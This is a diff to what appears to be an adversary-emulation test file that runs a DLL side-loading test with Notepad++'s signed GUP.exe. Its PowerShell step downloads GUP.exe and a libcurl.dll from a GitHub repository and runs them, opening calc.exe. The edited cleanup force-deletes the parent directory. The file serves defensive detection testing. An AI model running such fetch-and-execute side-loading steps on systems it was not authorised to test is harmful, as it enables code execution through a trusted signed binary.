@@ -3,8 +3,8 @@ api_version: 2.0
 uuid: a0dbea02-4978-4318-9af7-1aef1e2d2409
 name: DLL Side-Loading using the Notepad++ GUP.exe binary
 description: |
-  GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
-  Upon execution, calc.exe will be opened.
+  GUP is an open source signed binary used by Notepad++ for software updates, and it is vulnerable to DLL Side-Loading.
+  This enables the libcurl dll to be loaded and upon execution, calc.exe will be opened.
   Derived from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary
 requirements:
   platforms:
@@ -23,40 +23,85 @@ args:
     default: CalculatorApp
   - name: gup_exe
     description: GUP is an open source signed binary used by Notepad++ for software updates
-    type: path
-    default: bin\GUP.exe
+    type: string
+    default: $PWD\bin\GUP.exe
   - name: curl_dll
     description: GUP requires libcurl.dll to function
-    type: path
-    default: bin\libcurl.dll
+    type: string
+    default: $PWD\bin\libcurl.dll
 
 steps:
   - name: execute_GUP
     executor: powershell
     description: |
-        GUP.exe binary must exist on disk at specified location ({{.Args.gup_exe}}).
         Downloads GUP.exe, if not provided, and executes binary.
     inline: |
-      $parent = Split-Path "{{.Args.gup_exe}}" -Parent
-      if (-Not (Test-Path "{{.Args.gup_exe}}")) {
-        New-Item -Type Directory -Path ${parent} -ErrorAction Ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "{{.Args.gup_exe}}"
-        New-Item -ItemType File -Path "${parent}\.downloaded" -ErrorAction ignore | Out-Null
-      }
-      if (-Not (Test-Path "{{.Args.curl_dll}}")) {
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/libcurl.dll?raw=true" -OutFile "${parent}\libcurl.dll"
-          New-Item -ItemType File -Path "${parent}\.downloaded" -ErrorAction ignore | Out-Null
-      } else {
-          Copy-Item -Path "{{.Args.curl_dll}}" -Destination "${parent}\libcurl.dll"
+
+      Write-Host "GUP.exe binary must exist on disk at specified location ({{.Args.gup_exe}})."
+
+      $parentExe = Split-Path "{{.Args.gup_exe}}" -Parent
+      $parentDll = Split-Path "{{.Args.curl_dll}}" -Parent
+
+      if ($parentExe -cne $parentDll){
+        Write-Host "Error: GUP.exe and libcurl.dll must be in the same directory."
+        Write-Host "GUP.exe at: {{.Args.gup_exe}}"
+        Write-Host "libcurl.dll at: {{.Args.curl_dll}}"
+        exit 1
       }
 
-      &"{{.Args.gup_exe}}"
+      if (-Not (Test-Path "{{.Args.gup_exe}}")) {
+        Write-Host "GUP.exe not found. Downloading..."
+        New-Item -Type Directory -Path ${parentExe} -ErrorAction Ignore | Out-Null
+        try {
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "{{.Args.gup_exe}}"
+        } catch {
+          Write-Host "Failed to download GUP.exe : $_"
+          exit 1
+        }
+        Write-Host "GUP.exe downloaded to: {{.Args.gup_exe}}"
+      } else {
+          Write-Host "GUP.exe already exists at: {{.Args.gup_exe}}"
+      }
+
+      if (-Not (Test-Path "{{.Args.curl_dll}}")) {
+          Write-Host "libcurl.dll not found. Downloading..."
+          New-Item -Type Directory -Path ${parentDll} -ErrorAction Ignore | Out-Null
+          try {
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/libcurl.dll?raw=true" -OutFile "{{.Args.curl_dll}}"
+        } catch {
+          Write-Host "Failed to download libcurl.dll : $_"
+          exit 1
+        }
+        Write-Host "libcurl.dll downloaded to: {{.Args.curl_dll}}"
+      } else {
+          Write-Host "libcurl.dll already exists at: {{.Args.curl_dll}}"
+      }
+
+      Write-Host "Executing GUP.exe to test sideloading ....."
+      &{{.Args.gup_exe}}
 
     cleanup:
       executor: powershell
       inline: |
-        stop-process -name {{.Args.process_name}}
+        try {
+          Write-Host "Attempting to stop {{.Args.process_name}} process..."
+          Stop-Process -Name "{{.Args.process_name}}" -ErrorAction Stop
+          Write-Host "Successfully stopped {{.Args.process_name}}"
+        } catch {
+          Write-Host "Failed to stop {{.Args.process_name}}: $_"
+        }
+
         $parent = Split-Path "{{.Args.gup_exe}}" -Parent
-        if (Test-Path "${parent}\.downloaded"){
-          remove-item -r $parent
+        Write-Host "Parent directory to clean up: $parent"
+
+        if (Test-Path $parent) {
+          Write-Host "Attempting to remove directory: $parent"
+          Remove-Item -Path $parent -Recurse -Force -ErrorAction SilentlyContinue
+          if ($?) {
+            Write-Host "Successfully removed $parent"
+          } else {
+            Write-Host "Failed to remove $parent"
+          }
+        } else {
+          Write-Host "Directory $parent does not exist. No cleanup needed."
         }
